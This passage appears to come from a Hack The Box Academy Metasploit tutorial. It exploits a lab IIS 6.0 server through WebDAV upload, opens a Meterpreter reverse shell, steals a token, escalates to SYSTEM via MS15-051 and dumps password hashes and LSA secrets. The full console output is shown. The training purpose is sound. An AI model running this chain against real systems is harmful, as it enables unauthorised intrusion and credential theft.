[*] <span class="hljs-string">Nmap:</span> Service <span class="hljs-string">Info:</span> <span class="hljs-string">OS:</span> Windows; <span class="hljs-string">CPE:</span> <span class="hljs-string">cpe:</span>/<span class="hljs-string">o:</span><span class="hljs-string">microsoft:</span>windows
[*] <span class="hljs-string">Nmap:</span> Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
[*] <span class="hljs-string">Nmap:</span> Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">59.74</span> seconds


msf6 &gt; hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span>             Unknown                    device         


msf6 &gt; services

Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span>  <span class="hljs-number">80</span>    tcp    http  open   Microsoft IIS httpd <span class="hljs-number">6.0</span>
</code></pre>
<p>Next, we look up some information about the services running on this box. Specifically, we want to explore port 80 and what kind of web service is hosted there.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/39/S12\_SS01.png" alt=""></p>
<p>We notice it is an under-construction website—nothing web-related to see here. However, looking at both the end of the webpage and the result of the Nmap scan more closely, we notice that the server is running <code>Microsoft IIS httpd 6.0</code>. So we further our research in that direction, searching for common vulnerabilities for this version of IIS. After some searching, we find the following marker for a widespread vulnerability: <code>CVE-2017-7269</code>. It also has a Metasploit module developed for it.</p>
<p><strong>MSF - Searching for Exploit</strong></p>
<pre><code class="lang-shell-session">msf6 &gt; <span class="hljs-built_in">search</span> iis_webdav_upload_asp

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   <span class="hljs-number">0</span>  exploit/windows/iis/iis_webdav_upload_asp  <span class="hljs-number">2004</span>-<span class="hljs-number">12</span>-<span class="hljs-number">31</span>       excellent  No     Microsoft IIS WebDAV Write Access Code Execution


msf6 &gt; use <span class="hljs-number">0</span>

[*] No payload configured, defaulting <span class="hljs-keyword">to</span> windows/meterpreter/reverse_tcp


msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; show <span class="hljs-keyword">options</span>

Module <span class="hljs-keyword">options</span> (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         <span class="hljs-keyword">no</span>        The HTTP password <span class="hljs-keyword">to</span> specify <span class="hljs-keyword">for</span> authentication
   HttpUsername                         <span class="hljs-keyword">no</span>        The HTTP username <span class="hljs-keyword">to</span> specify <span class="hljs-keyword">for</span> authentication
   METHOD        <span class="hljs-keyword">move</span>                   yes       Move <span class="hljs-built_in">or</span> <span class="hljs-keyword">copy</span> the <span class="hljs-keyword">file</span> <span class="hljs-keyword">on</span> the remote <span class="hljs-built_in">system</span> from .txt -&gt; .asp (Accepted: <span class="hljs-keyword">move</span>, <span class="hljs-keyword">copy</span>)
   PATH          /metasploit%RAND%.asp  yes       The path <span class="hljs-keyword">to</span> attempt <span class="hljs-keyword">to</span> upload
   Proxies                              <span class="hljs-keyword">no</span>        A proxy chain of format <span class="hljs-built_in">type</span>:hos<span class="hljs-variable">t:port</span>[,<span class="hljs-built_in">type</span>:hos<span class="hljs-variable">t:port</span>][...]
   RHOSTS                               yes       The target host(s), <span class="hljs-built_in">range</span> CIDR identifier, <span class="hljs-built_in">or</span> hosts <span class="hljs-keyword">file</span> with <span class="hljs-keyword">syntax</span> <span class="hljs-string">'file:&lt;path&gt;'</span>
   RPORT         <span class="hljs-number">80</span>                     yes       The target port (TCP)
   SSL           false                  <span class="hljs-keyword">no</span>        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
   VHOST                                <span class="hljs-keyword">no</span>        HTTP server virtual host


Payload <span class="hljs-keyword">options</span> (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: <span class="hljs-string">''</span>, seh, thread, process, none)
   LHOST     <span class="hljs-number">10.10</span>.<span class="hljs-number">239.181</span>   yes       The listen address (<span class="hljs-keyword">an</span> interface may <span class="hljs-keyword">be</span> specified)
   LPORT     <span class="hljs-number">4444</span>             yes       The listen port


Exploit targe<span class="hljs-variable">t:</span>

   Id  Name
   --  ----
   <span class="hljs-number">0</span>   Automatic
</code></pre>
<p>We proceed to set the needed parameters. For now, these would be <code>LHOST</code>and <code>RHOST</code> as everything else on the target seems to be running the default configuration.</p>
<p><strong>MSF - Configuring Exploit &amp; Payload</strong></p>
<pre><code class="lang-shell-session">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set RHOST <span class="hljs-number">10.10.10.15</span>

RHOST =&gt; <span class="hljs-number">10.10.10.15</span>


msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set LHOST tun0

LHOST =&gt; tun0


msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; run

<span class="hljs-string">[*]</span> Started reverse TCP handler on <span class="hljs-number">10.10.14.26:4444</span> 
<span class="hljs-string">[*]</span> Checking /metasploit28857905.asp
<span class="hljs-string">[*]</span> Uploading <span class="hljs-number">612435</span> bytes to /metasploit28857905.txt...
<span class="hljs-string">[*]</span> Moving /metasploit28857905.txt to /metasploit28857905.asp...
<span class="hljs-string">[*]</span> Executing /metasploit28857905.asp...
<span class="hljs-string">[*]</span> Sending stage (<span class="hljs-number">175174</span> bytes) to <span class="hljs-number">10.10.10.15</span>
<span class="hljs-string">[*]</span> Deleting /metasploit28857905.asp (this doesn't always work)...
<span class="hljs-string">[!]</span> Deletion failed on /metasploit28857905.asp <span class="hljs-string">[403 Forbidden]</span>
<span class="hljs-string">[*]</span> Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.10.14.26:4444</span> -&gt; <span class="hljs-number">10.10.10.15:1030</span>) at <span class="hljs-number">2020</span>-<span class="hljs-number">09</span>-<span class="hljs-number">03</span> <span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-number">21</span> +<span class="hljs-number">0000</span>

meterpreter &gt;
</code></pre>
<p>We have our Meterpreter shell. However, take a close look at the output above. We can see a <code>.asp</code> file named <code>metasploit28857905</code> exists on the target system at this very moment. Once the Meterpreter shell is obtained, as mentioned before, it will reside within memory. Therefore, the file is not needed, and removal was attempted by <code>msfconsole</code>, which failed due to access permissions. Leaving traces like these is not beneficial to the attacker and creates a huge liability.</p>
<p>From the sysadmin&#39;s perspective, finding files that match this name type or slight variations of it can prove beneficial to stopping an attack in the middle of its tracks. Targeting regex matches against filenames or signatures as above will not even allow an attacker to spawn a Meterpreter shell before being cut down by the correctly configured security measures.</p>
<p>We proceed further with our exploits. Upon attempting to see which user we are running on, we get an access denied message. We should try migrating our process to a user with more privilege.</p>
<p><strong>MSF - Meterpreter Migration</strong></p>
<pre><code class="lang-shell-session">meterpreter &gt; getuid

[-] 1055: Operation failed: Access is denied.


meterpreter &gt; ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
&lt;...SNIP...&gt;

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY<span class="hljs-symbol">\N</span>ETWORK SERVICE  C:<span class="hljs-symbol">\W</span>INDOWS<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\w</span>bem<span class="hljs-symbol">\w</span>miprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:<span class="hljs-symbol">\W</span>INDOWS<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\r</span>ad9E519.tmp<span class="hljs-symbol">\s</span>vchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY<span class="hljs-symbol">\N</span>ETWORK SERVICE  c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\i</span>netsrv<span class="hljs-symbol">\w</span>3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY<span class="hljs-symbol">\N</span>ETWORK SERVICE  C:<span class="hljs-symbol">\W</span>INDOWS<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\i</span>netsrv<span class="hljs-symbol">\d</span>avcdata.exe
 4076  1080  cidaemon.exe                                                    


meterpreter &gt; steal_token 1836

Stolen token with username: NT AUTHORITY<span class="hljs-symbol">\N</span>ETWORK SERVICE


meterpreter &gt; getuid

Server username: NT AUTHORITY<span class="hljs-symbol">\N</span>ETWORK SERVICE
</code></pre>
<p>Now that we have established at least some privilege level in the system, it is time to escalate that privilege. So, we look around for anything interesting, and in the <code>C:\Inetpub\</code> location, we find an interesting folder named <code>AdminScripts</code>. However, unfortunately, we do not have permission to read what is inside it.</p>
<p><strong>MSF - Interacting with the Target</strong></p>
<pre><code class="lang-cmd-session">c:\Inetpub&gt;<span class="hljs-keyword">dir</span>

<span class="hljs-keyword">dir</span>
 Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is 246C-D7FE

 Directory of c:\Inetpub

04/12/2017  05:17 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          .
04/12/2017  05:17 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..
04/12/2017  05:16 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          AdminScripts
09/03/2020  01:10 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          wwwroot
               0 <span class="hljs-keyword">File</span>(s)              0 bytes
               4 <span class="hljs-keyword">Dir</span>(s)  18,125,160,448 bytes free


c:\Inetpub&gt;<span class="hljs-keyword">cd</span> AdminScripts

<span class="hljs-keyword">cd</span> AdminScripts
Access is denied.
</code></pre>
<p>We can easily decide to run the local exploit suggester module, attaching it to the currently active Meterpreter session. To do so, we background the current Meterpreter session, search for the module we need, and set the SESSION option to the index number for the Meterpreter session, binding the module to it.</p>
<p><strong>MSF - Session Handling</strong></p>
<pre><code class="lang-shell-session">meterpreter &gt; bg

Background session 1? [y/<span class="hljs-keyword">N</span>]  <span class="hljs-built_in">y</span>


msf6 exploit(windows/<span class="hljs-keyword">iis</span>/iis_webdav_upload_asp) &gt; <span class="hljs-keyword">search</span> local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  <span class="hljs-keyword">post</span>/multi/recon/local_exploit_suggester                   normal  <span class="hljs-keyword">No</span>     Multi Recon <span class="hljs-keyword">Local</span> Exploit Suggester


msf6 exploit(windows/<span class="hljs-keyword">iis</span>/iis_webdav_upload_asp) &gt; <span class="hljs-keyword">use</span> 0
msf6 <span class="hljs-keyword">post</span>(multi/recon/local_exploit_suggester) &gt; show options

Module options (<span class="hljs-keyword">post</span>/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to <span class="hljs-keyword">run</span> this module <span class="hljs-keyword">on</span>
   SHOWDESCRIPTION  false            yes       Displays a detailed description <span class="hljs-keyword">for</span> the available exploits


msf6 <span class="hljs-keyword">post</span>(multi/recon/local_exploit_suggester) &gt; <span class="hljs-keyword">set</span> SESSION 1

SESSION =&gt; 1


msf6 <span class="hljs-keyword">post</span>(multi/recon/local_exploit_suggester) &gt; <span class="hljs-keyword">run</span>

[*] 10.10.10.15 - Collecting <span class="hljs-keyword">local</span> exploits <span class="hljs-keyword">for</span> x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated <span class="hljs-keyword">in</span> Rubygems 4
[+] 10.10.10.15 - exploit/windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/<span class="hljs-keyword">local</span>/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/<span class="hljs-keyword">local</span>/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/<span class="hljs-keyword">local</span>/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/<span class="hljs-keyword">local</span>/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/<span class="hljs-keyword">local</span>/ppr_flatten_rec: The target appears to be vulnerable.
[*] <span class="hljs-keyword">Post</span> module execution completed
msf6 <span class="hljs-keyword">post</span>(multi/recon/local_exploit_suggester) &gt;
</code></pre>
<p>Running the recon module presents us with a multitude of options. Going through each separate one, we land on the <code>ms15_051_client_copy_image</code> entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.</p>
<p><strong>MSF - Privilege Escalation</strong></p>
<pre><code class="lang-shell-session">msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms15_051_client_copy_images

[*] <span class="hljs-keyword">No</span> payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; show <span class="hljs-keyword">options</span>

Module <span class="hljs-keyword">options</span> (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   <span class="hljs-keyword">yes</span>       The session to run this module on.


Payload <span class="hljs-keyword">options</span> (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           <span class="hljs-keyword">yes</span>       Exit technique (Accepted: <span class="hljs-string">''</span>, seh, thread, process, none)
   LHOST     <span class="hljs-number">46.101</span><span class="hljs-number">.239</span><span class="hljs-number">.181</span>   <span class="hljs-keyword">yes</span>       The listen address (an interface may be specified)
   LPORT     <span class="hljs-number">4444</span>             <span class="hljs-keyword">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="hljs-number">0</span>   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; <span class="hljs-keyword">set</span> session <span class="hljs-comment">1</span>

session <span class="hljs-comment">=&gt; 1</span>


msf6 <span class="hljs-comment">exploit(windows</span>/local/<span class="hljs-comment">ms15_051_client_copy_image) &gt; set LHOST tun0</span>

LHOST <span class="hljs-comment">=&gt; tun0</span>


msf6 <span class="hljs-comment">exploit(windows</span>/local/<span class="hljs-comment">ms15_051_client_copy_image) &gt; run</span>

[*] Started <span class="hljs-comment">reverse TCP handler on 10.10.14.26:4444</span> 
[*] Launching <span class="hljs-comment">notepad to host the exploit...</span>
[+] Process <span class="hljs-comment">844 launched.</span>
[*] Reflectively <span class="hljs-comment">injecting the exploit DLL into 844...</span>
[*] Injecting <span class="hljs-comment">exploit into 844...</span>
[*] Exploit <span class="hljs-comment">injected. Injecting payload into 844...</span>
[*] Payload <span class="hljs-comment">injected. Executing exploit...</span>
[+] Exploit <span class="hljs-comment">finished, wait for (hopefully privileged) payload execution to complete.</span>
[*] Sending <span class="hljs-comment">stage (175174 bytes) to 10.10.10.15</span>
[*] Meterpreter <span class="hljs-comment">session 2 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000</span>


meterpreter <span class="hljs-comment">&gt; getuid</span>

Server <span class="hljs-comment">username: NT AUTHORITY\SYSTEM</span>
</code></pre>
<p>From here, we can proceed to use the plethora of Meterpreter functionalities. For example, extracting hashes, impersonating any process we want, and others.</p>
<p><strong>MSF - Dumping Hashes</strong></p>
<pre><code class="lang-shell-session">meterpreter &gt; hashdump
<span class="hljs-symbol">
Administrator:</span><span class="hljs-number">500</span>:<span class="hljs-string">c74761604a24f0dfd0a9ba2c30e462cf:</span><span class="hljs-string">d6908f022af0373e9e21b8a241c86dca:</span>::
<span class="hljs-string">ASPNET:</span><span class="hljs-number">1007</span>:<span class="hljs-number">3</span><span class="hljs-string">f71d62ec68a06a39721cb3f54f04a3b:</span><span class="hljs-string">edc0d5506804653f58964a2376bbd769:</span>::
<span class="hljs-string">Guest:</span><span class="hljs-number">501</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">IUSR_GRANPA:</span><span class="hljs-number">1003</span>:<span class="hljs-string">a274b4532c9ca5cdf684351fab962e86:</span><span class="hljs-number">6</span><span class="hljs-string">a981cb5e038b2d8b713743a50d89c88:</span>::
<span class="hljs-string">IWAM_GRANPA:</span><span class="hljs-number">1004</span>:<span class="hljs-number">95</span><span class="hljs-string">d112c4da2348b599183ac6b1d67840:</span><span class="hljs-string">a97f39734c21b3f6155ded7821d04d16:</span>::
<span class="hljs-string">Lakis:</span><span class="hljs-number">1009</span>:<span class="hljs-string">f927b0679b3cc0e192410d9b0b40873c:</span><span class="hljs-number">3064</span><span class="hljs-string">b6fc432033870c6730228af7867c:</span>::
<span class="hljs-string">SUPPORT_388945a0:</span><span class="hljs-number">1001</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">8</span><span class="hljs-string">ed3993efb4e6476e4f75caebeca93e6:</span>::


meterpreter &gt; lsa_dump_sam

[+] Running <span class="hljs-keyword">as</span> SYSTEM
[*] Dumping SAM
<span class="hljs-string">Domain :</span> GRANNY
<span class="hljs-string">SysKey :</span> <span class="hljs-number">11</span>b5033b62a3d2d6bb80a0d45ea88bfb
Local <span class="hljs-string">SID :</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1709780765</span><span class="hljs-number">-3897210020</span><span class="hljs-number">-3926566182</span>

<span class="hljs-string">SAMKey :</span> <span class="hljs-number">37</span>ceb48682ea1b0197c7ab294ec405fe

<span class="hljs-string">RID  :</span> <span class="hljs-number">000001</span>f4 (<span class="hljs-number">500</span>)
<span class="hljs-string">User :</span> Administrator
  Hash <span class="hljs-string">LM  :</span> c74761604a24f0dfd0a9ba2c30e462cf
  Hash <span class="hljs-string">NTLM:</span> d6908f022af0373e9e21b8a241c86dca

<span class="hljs-string">RID  :</span> <span class="hljs-number">000001</span>f5 (<span class="hljs-number">501</span>)
<span class="hljs-string">User :</span> Guest

<span class="hljs-string">RID  :</span> <span class="hljs-number">000003e9</span> (<span class="hljs-number">1001</span>)
<span class="hljs-string">User :</span> SUPPORT_388945a0
  Hash <span class="hljs-string">NTLM:</span> <span class="hljs-number">8</span>ed3993efb4e6476e4f75caebeca93e6

<span class="hljs-string">RID  :</span> <span class="hljs-number">000003</span>eb (<span class="hljs-number">1003</span>)
<span class="hljs-string">User :</span> IUSR_GRANPA
  Hash <span class="hljs-string">LM  :</span> a274b4532c9ca5cdf684351fab962e86
  Hash <span class="hljs-string">NTLM:</span> <span class="hljs-number">6</span>a981cb5e038b2d8b713743a50d89c88

<span class="hljs-string">RID  :</span> <span class="hljs-number">000003</span>ec (<span class="hljs-number">1004</span>)
<span class="hljs-string">User :</span> IWAM_GRANPA
  Hash <span class="hljs-string">LM  :</span> <span class="hljs-number">95</span>d112c4da2348b599183ac6b1d67840
  Hash <span class="hljs-string">NTLM:</span> a97f39734c21b3f6155ded7821d04d16

<span class="hljs-string">RID  :</span> <span class="hljs-number">000003</span>ef (<span class="hljs-number">1007</span>)
<span class="hljs-string">User :</span> ASPNET
  Hash <span class="hljs-string">LM  :</span> <span class="hljs-number">3</span>f71d62ec68a06a39721cb3f54f04a3b
  Hash <span class="hljs-string">NTLM:</span> edc0d5506804653f58964a2376bbd769

<span class="hljs-string">RID  :</span> <span class="hljs-number">000003</span>f1 (<span class="hljs-number">1009</span>)
<span class="hljs-string">User :</span> Lakis
  Hash <span class="hljs-string">LM  :</span> f927b0679b3cc0e192410d9b0b40873c
  Hash <span class="hljs-string">NTLM:</span> <span class="hljs-number">3064</span>b6fc432033870c6730228af7867c
</code></pre>
<p><strong>MSF - Meterpreter LSA Secrets Dump</strong></p>
<pre><code class="lang-shell-session">meterpreter &gt; lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
Domain name : HTB

Policy subsystem is : 1.7
LSA Key : ada60ee248094ce782807afae1711b2c

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
cur/hex : e9 1c c7<span class="hljs-number"> 89 </span>aa<span class="hljs-number"> 02 </span>92<span class="hljs-number"> 49 </span>84<span class="hljs-number"> 58 </span>a4<span class="hljs-number"> 26 </span>8c 7b 1e c2 

Secret  : DPAPI_SYSTEM
cur/hex :<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>00 7a 3b<span class="hljs-number"> 72 </span>f3 cd ed<span class="hljs-number"> 29 </span>ce b8<span class="hljs-number"> 09 </span>5b b0 e2<span class="hljs-number"> 63 </span>73 8a ab c6 ca<span class="hljs-number"> 49 </span>2b<span class="hljs-number"> 31 </span>e7 9a<span class="hljs-number"> 48 </span>4f 9c b3<span class="hljs-number"> 10 </span>fc fd<span class="hljs-number"> 35 </span>bd d7 d5<span class="hljs-number"> 90 </span>16 5f fc<span class="hljs-number"> 63 </span>
    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63

Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
cur/hex :<span class="hljs-number"> 52 </span>53<span class="hljs-number"> 41 </span>32<span class="hljs-number"> 48 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>02<span class="hljs-number"> 00 </span>00 3f<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>01<span class="hljs-number"> 00 </span>01<span class="hljs-number"> 00 </span>b3 ec 6b<span class="hljs-number"> 48 </span>4c ce e5<span class="hljs-number"> 48 </span>f1 cf<span class="hljs-number"> 87 </span>4f e5<span class="hljs-number"> 21 </span>00<span class="hljs-number"> 39 </span>0c<span class="hljs-number"> 35 </span>87<span class="hljs-number"> 88 </span>f2<span class="hljs-number"> 51 </span>41 e2 2a e0<span class="hljs-number"> 01 </span>83 a4<span class="hljs-number"> 27 </span>92 b5<span class="hljs-number"> 30 </span>12 aa<span class="hljs-number"> 70 </span>08<span class="hljs-number"> 24 </span>7c 0e de f7 b0<span class="hljs-number"> 22 </span>69 1e<span class="hljs-number"> 70 </span>97 6e<span class="hljs-number"> 97 </span>61 d9 9f 8c<span class="hljs-number"> 13 </span>fd<span class="hljs-number"> 84 </span>dd<span class="hljs-number"> 75 </span>37<span class="hljs-number"> 35 </span>61<span class="hljs-number"> 89 </span>c8<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 97 </span>a5<span class="hljs-number"> 33 </span>32 1b ca<span class="hljs-number"> 65 </span>54 8e<span class="hljs-number"> 68 </span>81 fe<span class="hljs-number"> 46 </span>d5<span class="hljs-number"> 74 </span>e8 f0<span class="hljs-number"> 41 </span>72 bd c6 1e<span class="hljs-number"> 92 </span>78<span class="hljs-number"> 79 </span>28 ca<span class="hljs-number"> 33 </span>10 ff<span class="hljs-number"> 86 </span>f0<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 45 </span>6d d9 8a 7b<span class="hljs-number"> 14 </span>2d<span class="hljs-number"> 53 </span>bf aa f2<span class="hljs-number"> 07 </span>a1<span class="hljs-number"> 20 </span>29 b7 0b ac 1c c4<span class="hljs-number"> 63 </span>a4<span class="hljs-number"> 41 </span>1c<span class="hljs-number"> 64 </span>1f<span class="hljs-number"> 41 </span>57<span class="hljs-number"> 17 </span>d1 6f d5<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 59 </span>5b 8e<span class="hljs-number"> 14 </span>87 5f a4 bc 6d 8b d4 a9<span class="hljs-number"> 44 </span>6f<span class="hljs-number"> 74 </span>21 c3 bd 8f c5 4b a3<span class="hljs-number"> 81 </span>30 1a f6 e3<span class="hljs-number"> 71 </span>10<span class="hljs-number"> 94 </span>39<span class="hljs-number"> 52 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>9d<span class="hljs-number"> 21 </span>af 8c fe 8f 9c<span class="hljs-number"> 56 </span>89 a6 f4<span class="hljs-number"> 33 </span>f0 5a<span class="hljs-number"> 54 </span>e2<span class="hljs-number"> 21 </span>77 c2 f4 5c<span class="hljs-number"> 33 </span>42 d8 6a d6 a5 bb<span class="hljs-number"> 96 </span>ef df 3d<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 8c fa<span class="hljs-number"> 52 </span>cb da c7<span class="hljs-number"> 10 </span>71<span class="hljs-number"> 10 </span>ad 7f b6 7d fb dc<span class="hljs-number"> 47 </span>40 b2 0b d9 6a ff<span class="hljs-number"> 25 </span>bc 5f 7f ae 7b 2b b7 4c c4<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 89 </span>ed<span class="hljs-number"> 35 </span>0b<span class="hljs-number"> 84 </span>4b 2a<span class="hljs-number"> 42 </span>70 f6<span class="hljs-number"> 51 </span>ab ec<span class="hljs-number"> 76 </span>69<span class="hljs-number"> 23 </span>57 e3 8f 1b c3 b1<span class="hljs-number"> 99 </span>9e<span class="hljs-number"> 31 </span>09 1d 8c<span class="hljs-number"> 38 </span>0d e7<span class="hljs-number"> 99 </span>57<span class="hljs-number"> 36 </span>35<span class="hljs-number"> 06 </span>bc<span class="hljs-number"> 95 </span>c9 0a da<span class="hljs-number"> 16 </span>14<span class="hljs-number"> 34 </span>08 f0 8e 9a<span class="hljs-number"> 08 </span>b9<span class="hljs-number"> 67 </span>8c<span class="hljs-number"> 09 </span>94 f7<span class="hljs-number"> 22 </span>2e<span class="hljs-number"> 29 </span>5a<span class="hljs-number"> 10 </span>12 8f<span class="hljs-number"> 35 </span>1c<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 

Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
cur/hex :<span class="hljs-number"> 00 </span>f2 d1<span class="hljs-number"> 31 </span>e2<span class="hljs-number"> 11 </span>d3<span class="hljs-number"> 01 </span>

Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}
cur/hex : ca<span class="hljs-number"> 66 </span>0b f5<span class="hljs-number"> 42 </span>90 b1 2b<span class="hljs-number"> 64 </span>a0 c5<span class="hljs-number"> 87 </span>a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4<span class="hljs-number"> 03 </span>cf 7a f1 7f 4c bc fc b4<span class="hljs-number"> 84 </span>36<span class="hljs-number"> 40 </span>6a<span class="hljs-number"> 34 </span>f9<span class="hljs-number"> 89 </span>56 aa f4<span class="hljs-number"> 43 </span>ef<span class="hljs-number"> 85 </span>58<span class="hljs-number"> 38 </span>3b a8<span class="hljs-number"> 34 </span>f0 dc c3 7f 
old/hex : ca<span class="hljs-number"> 66 </span>0b f5<span class="hljs-number"> 42 </span>90 b1 2b<span class="hljs-number"> 64 </span>a0 c5<span class="hljs-number"> 87 </span>a7 db 9a 8a 2e c8 e9<span class="hljs-number"> 13 </span>e6 5f<span class="hljs-number"> 17 </span>a9<span class="hljs-number"> 42 </span>93 c2 e3 4c 8c c3<span class="hljs-number"> 59 </span>b8 c2 dd<span class="hljs-number"> 12 </span>a9 6a b2 4c<span class="hljs-number"> 22 </span>61 5f 1f ab ab ff 0c e0<span class="hljs-number"> 93 </span>e2 e6 bf ea e7<span class="hljs-number"> 16 </span>

Secret  : NL$KM
